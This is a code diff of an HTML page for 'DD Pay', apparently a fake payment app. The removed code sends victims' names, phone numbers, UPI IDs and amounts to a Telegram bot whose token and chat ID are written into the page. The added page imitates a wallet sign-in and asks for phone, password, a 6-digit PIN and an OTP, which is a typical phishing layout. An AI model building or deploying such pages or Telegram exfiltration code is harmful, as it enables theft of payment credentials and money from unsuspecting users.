@@ -3,42 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DD Pay</title>
+<title>DD Pay - Sign In</title>
 <script src="https://cdn.tailwindcss.com"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
-<body class="bg-black min-h-screen flex items-center justify-center p-4">
-<div class="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(120,120,120,0.18),transparent_60%)]"></div>
-<div class="w-full max-w-[420px] relative z-10">
-<div class="bg-zinc-900/90 backdrop-blur-xl border border-zinc-800 rounded-[32px] p-8 shadow-2xl">
-<div class="flex items-center justify-between mb-2">
-<h1 class="text-[28px] font-black text-white">DD PAY</h1>
-<span class="text-[11px] font-bold bg-green-500/15 text-green-400 border border-green-500/20 px-3 py-1 rounded-full">● LIVE</span>
+<body class="bg-[#f2f7fb] min-h-screen flex justify-center">
+<div class="w-full max-w-[420px] bg-[#f2f7fb] min-h-screen p-6 flex flex-col">
+<!-- Logo -->
+<div class="flex flex-col items-center mt-8 mb-10">
+<img src="https://i.ibb.co/9mQ4p1c/ddpay-logo.png" onerror="this.style.display='none'" alt="">
+<div class="w-48 h-32 bg-gradient-to-br from-yellow-400 via-blue-500 to-green-500 rounded-[20px] flex items-center justify-center mb-3 shadow-lg" style="background: linear-gradient(135deg, #3b82f6, #f59e0b, #10b981);">
+<i class="fas fa-wallet text-white text-4xl"></i>
 </div>
-<p class="text-zinc-500 text-[13px] mb-7">Fast • Secure • Instant Payment</p>
-<form id="ddForm" class="space-y-4">
-<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Full Name</label><input name="Name" required placeholder="Enter your name" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
-<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Phone Number</label><input name="Phone" required placeholder="98765 43210" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
-<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">UPI ID</label><input name="UPI" required placeholder="yourname@upi" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
-<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Amount</label><div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500 font-bold">₹</span><input name="Amount" required placeholder="500" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl pl-8 pr-4 py-3.5 text-white"></div></div>
-<button id="btn" type="submit" class="w-full bg-white text-black font-bold rounded-xl py-4 mt-2">Pay Now</button>
-</form>
-<p id="msg" class="text-center text-[13px] mt-4"></p>
-<div class="text-center mt-6 text-[11px] text-zinc-600">🔒 Secure payment powered by UPI</div>
+<h1 class="text-[38px] font-black leading-none"><span class="text-orange-500">DD</span><span class="text-[#0a8a5b]">Pay</span></h1>
+<p class="text-[10px] tracking-[4px] text-gray-500 font-bold mt-1">TAGLINE HERE</p>
+</div>
+
+<!-- Form -->
+<div class="space-y-4">
+<div class="bg-white rounded-full px-5 py-4 flex items-center gap-3 shadow-sm border border-gray-100">
+<i class="far fa-user text-[#0a8a5b] text-xl ml-1"></i>
+<input type="tel" placeholder="Phone" class="flex-1 outline-none text-[15px] text-gray-700 placeholder:text-gray-400 bg-transparent">
+</div>
+<div class="bg-white rounded-full px-5 py-4 flex items-center gap-3 shadow-sm border border-gray-100">
+<i class="fas fa-lock text-[#0a8a5b] text-xl ml-1"></i>
+<input type="password" placeholder="Password" class="flex-1 outline-none text-[15px] text-gray-700 placeholder:text-gray-400 bg-transparent">
+</div>
+<div class="bg-white rounded-full px-5 py-4 flex items-center gap-3 shadow-sm border border-gray-100">
+<i class="fas fa-key text-[#0a8a5b] text-xl ml-1"></i>
+<input type="password" placeholder="6-Digit PIN" maxlength="6" class="flex-1 outline-none text-[15px] text-gray-700 placeholder:text-gray-400 bg-transparent">
 </div>
 </div>
+
+<!-- Links -->
+<div class="flex items-center justify-between mt-6 px-2">
+<a href="#" class="text-[#0a8a5b] underline font-medium text-[15px]">Register</a>
+<label class="flex items-center gap-2 text-[15px] text-[#0a8a5b] font-medium cursor-pointer">
+<input type="checkbox" class="w-5 h-5 rounded-full border-gray-300 accent-[#0a8a5b]"> Remember Me
+</label>
+</div>
+
+<div class="flex items-center justify-center gap-2 mt-6 text-[#0a8a5b]">
+<input type="radio" checked class="accent-[#0a8a5b] w-5 h-5"> 
+<span class="text-[15px]">Agree <a href="#" class="underline">"User Privacy Agreement"</a></span>
+</div>
+
+<!-- Sign In Button -->
+<button id="openOtp" class="w-full bg-[#0a8a5b] text-white font-bold text-[20px] rounded-full py-4 mt-8 shadow-lg shadow-green-700/20 active:scale-[0.98] transition">Sign In</button>
+
+<a href="#" class="text-center block mt-8 text-[#0a8a5b] underline font-medium text-[16px]">Forget Password</a>
+
+<!-- OTP MODAL -->
+<div id="otpModal" class="fixed inset-0 bg-black/40 hidden items-center justify-center p-5 z-50">
+<div class="bg-white rounded-[28px] w-full max-w-[380px] p-7 shadow-2xl">
+<div class="flex justify-between items-center mb-6">
+<h2 class="text-[22px] font-bold text-gray-800">Login OTP</h2>
+<button id="closeOtp" class="w-9 h-9 bg-gray-100 rounded-full flex items-center justify-center"><i class="fas fa-times text-gray-500"></i></button>
+</div>
+<p class="text-[#0a8a5b] text-[14px] leading-6">Tap Send to receive the OTP, then enter it to confirm this login.</p>
+<p class="text-[#0a8a5b] font-bold text-[14px] mt-3">OTP will be sent to +91 5569888998</p>
+
+<div class="mt-6 bg-white border border-gray-200 rounded-full px-4 py-2 flex items-center gap-3">
+<i class="far fa-envelope text-[#0a8a5b] text-xl ml-1"></i>
+<input type="text" placeholder="Enter 6-digit OTP" maxlength="6" class="flex-1 outline-none text-[15px] bg-transparent">
+<button class="bg-[#0a8a5b] text-white px-6 py-2.5 rounded-full text-[15px] font-medium">Send</button>
+</div>
+
+<button class="w-full bg-[#0a8a5b] text-white font-bold text-[18px] rounded-full py-4 mt-6">Confirm</button>
+</div>
+</div>
+</div>
+
 <script>
-document.getElementById('ddForm').addEventListener('submit', async (e)=>{
-e.preventDefault();
-const btn=document.getElementById('btn'); const msg=document.getElementById('msg');
-btn.textContent='Sending...'; btn.disabled=true;
-let text=`🔥 DD Pay - Nayi Entry!\n\n`;
-const fd=new FormData(e.target);
-for(let [k,v] of fd.entries()) text+=`${k}: ${v}\n`;
-text+=`\nTime: ${new Date().toLocaleString('en-IN')}`;
-await fetch('https://api.telegram.org/bot8606684305:AAF5P-iR60pafefJwJ187neRGBhHsUWbuqs/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'7344589159',text:text})});
-msg.textContent='✅ Payment details sent!'; msg.className='text-center text-green-400 text-[13px] mt-4';
-e.target.reset(); btn.textContent='Pay Now'; btn.disabled=false;
-});
+document.getElementById('openOtp').onclick = () => {
+  document.getElementById('otpModal').classList.remove('hidden');
+  document.getElementById('otpModal').classList.add('flex');
+}
+document.getElementById('closeOtp').onclick = () => {
+  document.getElementById('otpModal').classList.add('hidden');
+  document.getElementById('otpModal').classList.remove('flex');
+}
 </script>
 </body>
 </html>
